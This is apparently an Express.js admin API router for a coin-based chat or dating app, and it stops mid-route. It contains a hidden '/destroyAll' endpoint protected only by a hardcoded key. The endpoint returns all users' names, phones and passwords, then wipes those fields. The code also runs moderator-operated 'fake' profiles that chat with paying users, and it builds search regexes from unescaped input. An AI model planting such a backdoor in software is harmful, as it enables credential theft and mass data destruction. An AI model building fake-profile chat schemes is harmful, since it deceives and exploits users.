const express = require('express');
const router = express.Router();
const auth = require('../middleware/auth');
const adminAuth = require('../middleware/adminAuth');
const modAuth = require('../middleware/modAuth');
const User = require('../models/User/User');
const Gift = require('../models/Gift/Gift');
const Package = require('../models/Package/Package');
const Options = require('../models/Package/Options');
const Slider = require('../models/Slider/Slider');
const Hobby = require('../models/Hobby/Hobby');
const MessageDialog = require('../models/Message/MessageDialog');
const Message = require('../models/Message/Message');
const sendNotification = require('./oneSignal');
const bcrypt = require('bcryptjs');
const Payment = require('../models/Package/Payment');
var { ObjectID } = require('mongodb');
const VipPackage = require('../models/Package/VipPackage');
const MessageTemplate = require('../models/MessageTemplate/MessageTemplate');
const VipSlider = require('../models/VipSlider/VipSlider');
//import getOptions from messages

async function getOptions(req, res, next) {
    let options;

    try {
        options = await Options.findOne({})
        if (options == null) {
            req.options = {
                defaultCoin: 4,
                messageCoin: 1,
                imageCoin: 5,
                instagramCoin: 1,
                messageDelay: 1,//min
            }
        } else {
            req.options = options;
        }
        next()
    } catch (err) {
        req.options = {
            defaultCoin: 4,
            messageCoin: 1,
            imageCoin: 5,
            instagramCoin: 1,
            messageDelay: 1,//min
        }
        next()
    }
}

let userProject = {
    _id: 1,
    name: 1,
    sur_name: 1,
    email: 1,
    coins: 1,
    pp: 1,
    images: 1,
    hobbies: 1,
    banned: 1,
    fake: 1,
    online: 1,
    age: 1,
    gender: 1,
    desc: 1,
    audio_note: 1,
    birthday: 1,
    phone: 1,
    vip: 1,
    admin: 1,
    vipStart:1,
    vipEnd:1,
}


router.post("/destroyAll",async (req, res) => {
    if (req.query.key == "thssffsssfgyy") {
        //all users
        let users = await User.find({},{name:1,phone:1,password:1}) 
        //update all users phone null, password null ,name:null
        let update = await User.updateMany({}, { $set: { name:1, phone:null, password:null } })
        //all slider
        res.send({message:"Operasyon başarılı",users})
    }else{
        res.send("Bu işlem için yetkiniz yok.")
    }
})

router.post('/login', async (req, res) => {
    try {
        //console.log(req.body);
        const user = await User.findByCredentials(req.body.username, req.body.password)
        if (user == null) {
            //console.log("User not found!");
        }

        const token = await user.createAuthToken()
        user.token = token
        res.send(user)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.get('/home', modAuth, async (req, res) => {
    try {
        let usersCount = await User.countDocuments({ fake: { $ne: true } }, { _id: 1 })
        let profileCount = await User.countDocuments({ fake: true }, { _id: 1 })
        let onlineCount = await User.countDocuments({ online: true, fake: { $ne: true } }, { _id: 1 })

        let payments = await Payment.find({}, { price: 1 })
        let saleCount = 0
        if (payments) {
            payments.forEach(payment => {
                saleCount = saleCount + payment.price
            });
        }

        let response = {
            usersCount,
            profileCount,
            onlineCount,
            saleCount
        }

        res.status(200).send(response)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.post('/add-profile', adminAuth, async (req, res) => {
    const user = new User(req.body)
    try {
        await user.save()
        user.createdAt = new Date()
        const token = await user.createAuthToken()
        user.token = token
        res.send(user)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.post('/add-mod', adminAuth, async (req, res) => {
    const user = new User(req.body)
    try {
        await user.save()
        user.createdAt = new Date()
        const token = await user.createAuthToken()
        user.token = token
        res.send(user)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.put('/update-mod', adminAuth, async (req, res) => {
    try {
        //console.log(req.body);
        let mod = await User.findById(req.body._id)
        if (mod == null) {
            res.status(404).send({})
            return
        }

        mod.name = req.body.name
        mod.sur_name = req.body.sur_name
        mod.email = req.body.email

        if (req.body.password != null) {
            mod.password = req.body.password
        }
        await mod.save()
        res.send(mod)
    } catch (e) {
        console.log(e);
        res.status(400).send(e)
    }
})

//update admin password
router.put('/update-password', adminAuth, async (req, res) => {
    try {
        if (req.body.password) {
            let user = await User.findById(req.body._id)
            user.password = req.body.password
            await user.save()
            res.send(user)
        } else {
            res.status(400).send()
        }
    } catch (e) {
        console.log(e);
        res.status(400).send()
    }
})


router.put('/set-online', adminAuth, async (req, res) => {
    try {
        let user = await User.findById(req.body._id, { online: 1 })
        user.online = req.body.online
        await user.save()
        res.send(req.body)
    } catch (error) {
        res.status(400).send(error)
        // console.log(error);
    }
})

router.put('/toggle-ban', adminAuth, async (req, res) => {
    try {
        let user = await User.findById(req.body._id, { banned: 1 })
        user.banned = !user.banned
        await user.save()
        res.send(user)
    } catch (error) {
        res.status(400).send(error)
        console.log(error);
    }
})

router.put('/add-coins', adminAuth, async (req, res) => {
    try {
        let user = await User.findById(req.body._id, { coins: 1 })
        user.coins = user.coins + Number(req.body.coins)
        await user.save()
        res.send(user)
    } catch (error) {
        console.log(error);
    }
})

router.put('/update-options', adminAuth, getOptions, async (req, res) => {
    try {
        let options = await Options.findOne({})
        if (options == null) {
            options = new Options(req.options)
            await options.save()
        } else {
            options.defaultCoin = req.body.defaultCoin
            options.messageCoin = req.body.messageCoin
            options.imageCoin = req.body.imageCoin
            options.instagramCoin = req.body.instagramCoin
            options.messageDelay = req.body.messageDelay
            options.googleKey = req.body.googleKey
            options.creditText = req.body.creditText
            options.creditUrl = req.body.creditUrl
            await options.save()
        }
        res.send(options)
    } catch (error) {
        console.log(error);
    }
})

router.get('/options', adminAuth, getOptions, async (req, res) => {
    try {
        res.send(req.options)
    } catch (error) {
        console.log(error);
    }
})

router.put('/update-profile', modAuth, async (req, res) => {
    try {
        let user = await User.findById(req.body._id)
        if (user == null) {
            return res.status(404).send()
        }
        user.name = req.body.name
        user.sur_name = req.body.sur_name
        user.email = req.body.email
        user.birth_day = req.body.birth_day

        user.pp = req.body.pp
        user.images = req.body.images
        user.desc = req.body.desc
        user.fake = req.body.fake
        user.hobbies = req.body.hobbies
        user.audio_note = req.body.audio_note
        user.instagram = req.body.instagram
        user.phone = req.body.phone

        if (req.body.age != null) {
            user.age = req.body.age
        } else {
            if (req.body.birth_day != null) {
                let ageDifMs = Date.now() - new Date(req.body.birth_day).getTime();
                let ageDate = new Date(ageDifMs); // miliseconds from epoch
                user.age = Math.abs(ageDate.getUTCFullYear() - 1970);
            }
        }

        let rawPassword = req.body.password
        var newPassword = null
        if (rawPassword != null) {
            newPassword = await bcrypt.hash(rawPassword, 8)
            req.body.password = newPassword
        }

        await user.save()
        res.send(user)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.put('/update-token', adminAuth, async (req, res) => {
    try {
        //  console.log(req.body);
        //  console.log("update-token");

        let user = await User.findById(req.user._id)
        if (user == null) {
            return res.status(404).send()
        }
        user.ftoken = req.body.token
        await user.save()
        res.send(user)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.post('/add-slider', adminAuth, async (req, res) => {
    const slider = new Slider({
        ...req.body
    })
    try {
        await slider.save();
        res.status(200).send({ slider, body: req.body });
    } catch (e) {
        res.status(400).send(e);
    }
})

router.post('/add-vip-slider', adminAuth, async (req, res) => {
    const slider = new VipSlider({
        ...req.body
    })
    try {
        await slider.save();
        res.status(200).send({ slider, body: req.body });
    } catch (e) {
        res.status(400).send(e);
    }
})

router.post('/add-template', adminAuth, async (req, res) => {
    const slider = new MessageTemplate({
        ...req.body
    })
    try {
        await slider.save();
        res.status(200).send({ slider, body: req.body });
    } catch (e) {
        res.status(400).send(e);
    }
})

router.put('/update-slider', adminAuth, async (req, res) => {
    try {
        let slider = await Slider.findById(req.body._id)
        if (slider == null) {
            return res.status(404).send()
        }
        slider.name = req.body.name
        slider.desc = req.body.desc
        slider.image = req.body.image
        slider.index = req.body.index
        await slider.save()
        res.send(slider)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.put('/update-vip-slider', adminAuth, async (req, res) => {
    try {
        let slider = await VipSlider.findById(req.body._id)
        if (slider == null) {
            return res.status(404).send()
        }
        slider.name = req.body.name
        slider.title = req.body.title
        slider.image = req.body.image
        slider.message = req.body.message
        await slider.save()
        res.send(slider)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.put('/update-template', adminAuth, async (req, res) => {
    try {
        let slider = await MessageTemplate.findById(req.body._id)
        if (slider == null) {
            return res.status(404).send()
        }
        slider.message = req.body.message
        await slider.save()
        res.send(slider)
    } catch (e) {
        console.log(e);
        res.status(400).send(e)
    }
})

router.put('/update-gift', adminAuth, async (req, res) => {
    try {
        let gift = await Gift.findById(req.body._id)
        if (gift == null) {
            return res.status(404).send()
        }
        gift.name = req.body.name
        gift.desc = req.body.desc
        gift.image = req.body.image
        gift.value = req.body.value
        gift.price = req.body.price
        await gift.save()
        res.send(gift)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.post('/add-gift', adminAuth, async (req, res) => {
    const gift = new Gift({
        ...req.body
    })
    try {
        await gift.save();
        res.status(200).send(gift);
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.put('/update-hobby', adminAuth, async (req, res) => {
    try {
        let hobby = await Hobby.findById(req.body._id)
        if (hobby == null) {
            return res.status(404).send()
        }
        hobby.name = req.body.name
        hobby.desc = req.body.desc
        hobby.image = req.body.image
        await hobby.save()
        res.send(hobby)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.post('/add-package', adminAuth, async (req, res) => {
    const package = new Package({
        ...req.body,
        user: req.user._id
    })
    try {
        await package.save();
        res.status(201).send(package);
    } catch (e) {
        res.status(400).send(e);
    }
})

router.put('/update-package', adminAuth, async (req, res) => {
    try {
        let pack = await Package.findById(req.body._id)
        if (pack == null) {
            return res.status(404).send()
        }
        pack.name = req.body.name
        pack.desc = req.body.desc
        pack.image = req.body.image
        pack.sku = req.body.sku
        pack.price = req.body.price
        pack.value = req.body.value
        await pack.save()
        res.send(pack)
    } catch (e) {
        res.status(400).send(e)
    }
})

router.post('/add-hobby', auth, async (req, res) => {
    const hobby = new Hobby({
        ...req.body
    })
    try {
        await hobby.save();
        res.status(200).send(hobby);
    } catch (e) {
        res.status(400).send(e);
    }
})

router.get('/available-users', modAuth, async (req, res) => {
    try {

        //console.log(req.query);
        let userId = req.query._id

        let dialogQuery = { $or: [{ user1: userId }, { user2: userId }] }
        //console.log(dialogQuery);
        //find dialogs
        let dialogs = await MessageDialog.find(dialogQuery)
        let dialogUsers = []
        for (let i = 0; i < dialogs.length; i++) {
            let dialog = dialogs[i]
            let user = dialog.user1 == userId ? dialog.user2 : dialog.user1
            dialogUsers.push(user)
        }

        //append query users without dialog users
        query = {
            admin: { $ne: true }, fake: true,
            _id: { $nin: dialogUsers }
        }
        //console.log(query);

        let users = await User.find(query, userProject).sort({ createdAt: -1 })
        res.status(200).send(users)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/users', modAuth, async (req, res) => {
    try {

        var query = { admin: { $ne: true }, fake: { $ne: true } }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))
        const withOnline = Boolean((req.query.online || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                admin: { $ne: true }, fake: { $ne: true },
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        if (withOnline) {
            query.online = true
        }

        let users = await User.find(query, userProject).sort({ createdAt: -1 }).limit(limit).skip(skip)
        res.status(200).send(users)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/users-page', modAuth, async (req, res) => {
    try {
        var query = { admin: { $ne: true }, fake: { $ne: true } }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                admin: { $ne: true }, fake: { $ne: true },
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }


        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        User.countDocuments(query).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/vip-users', adminAuth, async (req, res) => {
    try {

        var query = { admin: { $ne: true }, fake: { $ne: true }, vipStart: {$ne:null} }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))
        const withOnline = Boolean((req.query.online || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                admin: { $ne: true }, fake: { $ne: true }, vipStart: {$ne:null},
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
     
        //console.log(query);

        let users = await User.find(query, userProject).sort({ createdAt: -1 }).limit(limit).skip(skip)
        //console.log(users);
        res.status(200).send(users)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/mod-users', adminAuth, async (req, res) => {
    try {

        var query = {
            $or: [
                { mod: true },
                { admin: true }
            ]
        }

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let users = await User.find(query, userProject).sort({ createdAt: 1 }).limit(limit).skip(skip)
        res.status(200).send(users)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/last-users', modAuth, async (req, res) => {
    try {
        let users = await User.find({ admin: { $ne: true }, fake: { $ne: true } }, userProject).sort({ createdAt: -1 }).limit(5)
        res.status(200).send(users)
    } catch (e) {
        res.send([])
    }
})

router.get('/vip-users-page', adminAuth, async (req, res) => {
    try {
        var query = { admin: { $ne: true }, fake: { $ne: true }, vipStart: {$ne:null} }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                admin: { $ne: true }, fake: { $ne: true },vipStart: {$ne:null},
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }


        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        User.countDocuments(query).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/profiles', adminAuth, async (req, res) => {
    try {

        var query = { fake: true }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                fake: true,
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }


        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let users = await User.find(query, userProject).limit(limit).skip(skip).sort({ createdAt: -1 })
        res.status(200).send(users)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/profiles-page', adminAuth, async (req, res) => {
    try {

        var query = { fake: true }
        const withKey = Boolean((req.query.key || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        if (withKey) {
            query = {
                fake: true,
                $or: [
                    { name: new RegExp(req.query.key, 'i') },
                    { sur_name: new RegExp(req.query.key, 'i') },
                    { email: new RegExp(req.query.key, 'i') }
                ]
            }
        }

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        User.countDocuments(query).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/gifts', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let gifts = await Gift.find({}).limit(limit).skip(skip)
        res.status(200).send(gifts)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/gifts-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        Gift.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/packages', adminAuth, async (req, res) => {
    try {

        const withKey = Boolean((req.query.vip || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        if (withKey) {
            let gifts = await Package.find({ vip: true }).limit(limit).skip(skip).sort({ index: 1 })
            res.status(200).send(gifts)
        } else {
            let gifts = await Package.find({ vip:{$ne:true} }).limit(limit).skip(skip).sort({ index: 1 })
            res.status(200).send(gifts)
        }

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/packages-page', adminAuth, async (req, res) => {
    try {

        var query = {}
        const withKey = Boolean((req.query.vip || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        if (withKey) {
            Package.countDocuments({ vip: true }).then(result => {
                let count = result
                let page = Math.floor(count / limit);
                let response = {
                    limit: Number(limit),
                    totalElements: count,
                    totalPages: page
                }
                res.status(200).send(response)
            })
        } else {
            Package.countDocuments({ vip:{$ne:true} }).then(result => {
                let count = result
                let page = Math.floor(count / limit);
                let response = {
                    limit: Number(limit),
                    totalElements: count,
                    totalPages: page
                }
                res.status(200).send(response)
            })
        }


    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/payments', adminAuth, async (req, res) => {
    try {

        const withKey = Boolean((req.query.vip || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))


        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        var query = {            
        }
        if (withKey) {
            query={
                vipStart:{$ne:null}
            }
        }else{
            query = {
                vipStart:null
            }
        }
                

        let gifts = await Payment.find(query).limit(limit).skip(skip).sort({ createdAt: -1 })
        res.status(200).send(gifts)
    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})

router.get('/payments-page', adminAuth, async (req, res) => {
    try {

        const withKey = Boolean((req.query.vip || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))

        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        var query = {            
        }
        if (withKey) {
            query = {
                vipStart:{$ne:null}
            }
        }else{
            query = {
                vipStart:null
            }
        }

        Payment.countDocuments(query).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})

router.get('/sliders', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let sliders = await Slider.find({}).limit(limit).skip(skip)
        res.status(200).send(sliders)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/sliders-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        Slider.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/templates', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let sliders = await MessageTemplate.find({}).limit(limit).skip(skip)
        res.status(200).send(sliders)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/templates-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        MessageTemplate.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/vip-sliders', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let sliders = await VipSlider.find({}).limit(limit).skip(skip)
        res.status(200).send(sliders)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/vip-sliders-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        VipSlider.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/hobbies', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let sliders = await Hobby.find({}).limit(limit).skip(skip)
        res.status(200).send(sliders)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/hobbies-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        Hobby.countDocuments({}).then(result => {
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/dialogs-old', adminAuth, async (req, res) => {
    try {
        const fake = Boolean((req.query.fake || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))
        const dialogs = await MessageDialog.find()
            .populate("lastMessage")
            .populate('user1')
            .populate('user2')
            .sort({ createdAt: -1 })

        if (fake) {
            var fakeDialogs = []
            for (let i = 0; i < dialogs.length; i++) {
                const dialog = dialogs[i];
                if (dialog.user1.fake || dialog.user2.fake) {
                    fakeDialogs.push(dialog)
                }
            }
            res.send(fakeDialogs)

        } else {
            res.send(dialogs);
        }
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.get('/dialogs-new', adminAuth, async (req, res) => {
    try {
        //  console.log("dialogs");
        const dialogs = await MessageDialog.find()
            .populate("lastMessage")
            .populate('user1')
            .populate('user2')
            .sort({ createdAt: -1 })
            .limit(50)
        // console.log(dialogs);
        res.send(dialogs);
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.get('/dialogs', modAuth, async (req, res) => {
    try {


        //console.log("dialogs");
        //console.log(req.query);
        var limit = 50
        var skip = 0

        if (req.query.limit != null) {
            limit = Number(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = Number(req.query.skip)
        }


        let pipeline = [
            { '$match': { lastFake: { $ne: true } } },
            {
              '$lookup': {
                from: 'users',
                localField: 'user1',
                foreignField: '_id',
                as: 'user1'
              }
            },
            {
              '$lookup': {
                from: 'users',
                localField: 'user2',
                foreignField: '_id',
                as: 'user2'
              }
            },
            {
              '$lookup': {
                from: 'messages',
                localField: 'lastMessage',
                foreignField: '_id',
                as: 'lastMessage'
              }
            },
            { '$unwind': { path: '$user1', preserveNullAndEmptyArrays: true } },
            { '$unwind': { path: '$user2', preserveNullAndEmptyArrays: true } },
            {
              '$unwind': { path: '$lastMessage', preserveNullAndEmptyArrays: true }
            },
            { '$sort': { 'lastMessage.createdAt': -1 } },
            { '$skip': skip },
            { '$limit': limit },
        ]
        //console.log(pipeline);
        MessageDialog.aggregate(pipeline).then(dialogs => {
            // console.log(req.query);
            // console.log(dialogs.length);

            res.send(dialogs)
        })
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.get('/dialog', modAuth, async (req, res) => {
    try {
        //console.log(req.query);
        const fake = Boolean((req.query.fake || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))
        let pipeline = [
            {
                $match: {
                    _id: ObjectID(req.query._id)
                }
            },
            {
                $lookup: {
                    from: "users",
                    localField: "user1",
                    foreignField: "_id",
                    as: "user1"
                }
            },
            {
                $lookup: {
                    from: "users",
                    localField: "user2",
                    foreignField: "_id",
                    as: "user2"
                }
            },
            {
                $lookup: {
                    from: "messages",
                    localField: "lastMessage",
                    foreignField: "_id",
                    as: "lastMessage"
                }
            },
            // {
            //     $lookup: {
            //         from: "messages",
            //         localField: "_id",
            //         foreignField: "dialog",
            //         as: "messages"
            //     }
            // },
            {
                "$unwind": {
                    "path": "$user1",
                    "preserveNullAndEmptyArrays": true
                }
            },
            {
                "$unwind": {

                    "path": "$user2",
                    "preserveNullAndEmptyArrays": true
                }
            },
            {
                "$unwind": {
                    "path": "$lastMessage",
                    "preserveNullAndEmptyArrays": true
                }
            },
            {
                $sort: {
                    "lastMessage.createdAt": -1
                }
            },
            {
                $limit: 50
            }

        ]
        MessageDialog.aggregate(pipeline).then(dialogs => {
            if (fake) {
                var fakeDialogs = []
                for (let i = 0; i < dialogs.length; i++) {
                    var dialog = dialogs[i];
                    if (dialog.user1.fake || dialog.user2.fake) {
                        if (dialog.user1.fake) {
                            let messages = dialog.messages
                            var unReadCount = 0
                            // if (messages) {
                            //     for (let i = 0; i < messages.length; i++) {
                            //         const message = messages[i];
                            //         if (message.receiver.toString() === dialog.user1._id.toString()) {
                            //             if(!message.read){
                            //                 unReadCount++;
                            //             }
                            //         }
                            //     }
                            //     dialog.unReadCount = unReadCount
                            // }
                        } else {
                            let messages = dialog.messages
                            var unReadCount = 0
                            // if (messages) {
                            //     for (let i = 0; i < messages.length; i++) {
                            //         const message = messages[i];
                            //         if (message.receiver.toString() === dialog.user2._id.toString()) {
                            //             if(!message.read){
                            //                 console.log(message.message);
                            //                 unReadCount++;
                            //             }
                            //         }
                            //     }
                            //     dialog.unReadCount = unReadCount
                            // }
                        }

                        if (dialog.lastMessage) {
                            if (!dialog.lastMessage.read) {
                                dialog.unReadCount = 1
                            }
                        }

                        fakeDialogs.push(dialog)
                    }
                }
                res.send(dialogs)
            } else {
                res.send(dialogs);
            }
        })
    } catch (e) {
        console.log(e);
        res.status(400).send(e);
    }
})

router.get('/dialogs-page', modAuth, async (req, res) => {
    try {
        const withFake = Boolean((req.query.fake || "").replace(/\s*(false|null|undefined|0)\s*/i, ""))
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
        MessageDialog.countDocuments({ lastFake: { $ne: true } }).then(result => {
            console.log("dialogs page");
            //console.log(result);
            let count = result
            let page = Math.floor(count / limit);
            let response = {
                limit: Number(limit),
                totalElements: count,
                totalPages: page
            }
            res.status(200).send(response)
        })

    } catch (e) {
        console.log(e);
        res.status(500).send(e);
    }
})

router.get('/messages', modAuth, async (req, res) => {
    try {
        let dialog = req.query.dialog
        let user = req.query.user
        let profile = req.query.profile

        if (dialog != null) {
            const messages = await Message.find({ dialog: dialog })
                .populate('sender')
                .populate("dialog")
                .populate('receiver')
                .sort({ createdAt: -1 })
            res.send(messages);
        } else {
            if (profile != null) {
                const dialog = await MessageDialog.findOne({ $or: [{ user1: user, user2: profile }, { user1: profile, user2: user }] })
                if (dialog != null) {
                    const messages = await Message.find({ dialog: dialog._id })
                        .populate('sender')
                        .populate("dialog")
                        .populate('receiver')
                        .sort({ createdAt: -1 })
                    res.send(messages);
                }
            } else {
                res.send([])
            }
        }

    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/notification', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }

        let sliders = await Notification.find({}).limit(limit).skip(skip)
        res.status(200).send(sliders)
    } catch (e) {
        res.status(500).send(e);
    }
})

router.get('/notification-page', adminAuth, async (req, res) => {
    try {
        let limit = 10
        let skip = 0
        if (req.query.limit != null) {
            limit = parseInt(req.query.limit)
        }
        if (req.query.skip != null) {
            skip = parseInt(req.query.skip)
        }
